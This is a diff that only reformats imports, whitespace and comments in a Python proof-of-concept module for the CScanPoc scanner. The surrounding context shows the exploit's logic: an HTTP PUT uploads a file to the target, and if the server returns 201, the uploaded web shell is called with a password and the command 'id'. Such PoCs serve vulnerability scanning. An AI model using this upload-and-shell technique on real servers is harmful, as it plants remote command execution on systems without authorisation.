@@ -4,7 +4,9 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import sys
 import http.client
-import urllib.request, urllib.parse, urllib.error
+import urllib.request
+import urllib.parse
+import urllib.error
 import time
 
 
@@ -48,9 +50,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
 
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
@@ -73,7 +76,7 @@ class Poc(ABPoc):
                 conn.request(method='PUT', url=url, body=body)
                 res = conn.getresponse()
                 if res.status == 201:
-                    #print 'shell:', 'http://' + sys.argv[1] + url[:-7]
+                    # print 'shell:', 'http://' + sys.argv[1] + url[:-7]
                     urldone = 'http://' + host + url[:-1]
                     #print (urldone)
                     payload = {'pwd': '023', 'cmd': 'id'}
